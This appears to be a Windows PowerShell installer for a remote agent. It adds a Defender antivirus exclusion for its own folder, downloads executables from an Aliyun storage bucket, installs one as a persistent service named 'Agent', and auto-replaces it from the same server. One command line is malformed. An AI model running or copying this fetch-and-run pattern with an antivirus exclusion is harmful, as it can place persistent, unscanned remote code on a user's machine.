$ProgressPreference = 'SilentlyContinue'

# Sync Time

Start-Service W32Time -ErrorAction SilentlyContinue
w32tm /resync /force> | Out-Null


$localAppData = $env:LOCALAPPDATA
$targetDirectory = Join-Path $localAppData "utools"

# CREATE TARGET FOLDER
if (-not(Test-Path $targetDirectory))
{
  New-Item -Path $targetDirectory -ItemType Directory | Out-Null
}

# SET WDF RULE
if (-not ($targetDirectory -in (Get-MpPreference).ExclusionPath))
{
  Add-MpPreference -ExclusionPath $targetDirectory -ErrorAction SilentlyContinue
  if ($?) {Write-Host -ForegroundColor Green "Change Windows Defender OK"}else{Write-Host -ForegroundColor Red "Change Windows Defender Fail"}
}
else
{
  Write-Host -ForegroundColor Green "Windows Defender NOT NEED TO CHANGE."
}



# Set windows console encoding to UTF-8

# Remove-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Command Processor\' -Name autorun -Force -ErrorAction SilentlyContinue | Out-Null

# New-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Command Processor\' -Name autorun -Type String -Value "chcp 65001" -ErrorAction SilentlyContinue | Out-Null

$nssm="https://it2u.oss-cn-shenzhen.aliyuncs.com/utools/nssm.exe"
$client="https://it2u.oss-cn-shenzhen.aliyuncs.com/forWin.exe"

# INIT INSTALLATION AND IF NOT EXIST Service.
if( -not (Test-Path -Path $targetDirectory\nssm.exe)) {
  Invoke-WebRequest -Uri $nssm -OutFile $targetDirectory\"nssm.exe" -ErrorAction SilentlyContinue 
  Invoke-WebRequest -Uri $client -OutFile $targetDirectory\"forWin.exe" -ErrorAction SilentlyContinue
}

if (-not ((Get-Service -Name Agent -ErrorAction SilentlyContinue).Status -eq "Running")) {
  start-process -FilePath "$env:ComSpec" -WorkingDirectory $targetDirectory -ArgumentList "/c"," nssm install Agent forWin.exe" -NoNewWindow -Wait
  Get-Service -Name Agent -ErrorAction SilentlyContinue | start-service
}


# CHECK VERSION AND IF Service is NOT lastest version.

if ((Get-Service -Name Agent -ErrorAction SilentlyContinue).Status -eq "Running")
{
  Write-Host -ForegroundColor Green "Stop service for maintaining."
  stop-service -Name Agent -Force -ErrorAction SilentlyContinue
  Stop-Process -Name forWin -Force -ErrorAction SilentlyContinue
  Start-Sleep -Seconds 2

  # STOP SERVICE FOR CHECK SERVICE BIN FILE MD5 HASH CODE WITH  LOCATE SERVER SIDE VALUE.
  $flags = (Get-FileHash -Algorithm MD5 $targetDirectory\"forWin.exe").Hash -eq (Invoke-RestMethod -Uri https://it2u.oss-cn-shenzhen.aliyuncs.com/md5.json).Hash

  if (-not $flags)
  # IF MD5 HASH NOT MATCH ,REPALCE THE BIN FILE.
  {
    Invoke-WebRequest -Uri $client -OutFile $targetDirectory\"forWin.exe" -ErrorAction SilentlyContinue
    if ($?) {Write-Host -ForegroundColor Green " Update Service File OK"}else{Write-Host -ForegroundColor Red "Update Service File Fail"}

    Start-Service -Name Agent -ErrorAction SilentlyContinue
    if ($?) {Write-Host -ForegroundColor Green " Start Service OK"}else{Write-Host -ForegroundColor Red "Start Service  Fail"}
  }
  else
  # RESUME THE SERVICE WHICH STOPPED.
  {
    Write-Host -ForegroundColor Green "Nothing NEED ToDo."
    Start-Service -Name Agent -ErrorAction SilentlyContinue
    if ($?) {Write-Host -ForegroundColor Green "Service IS RESUME "}else{Write-Host -ForegroundColor Red "Start Service  Fail"}
  } 
}
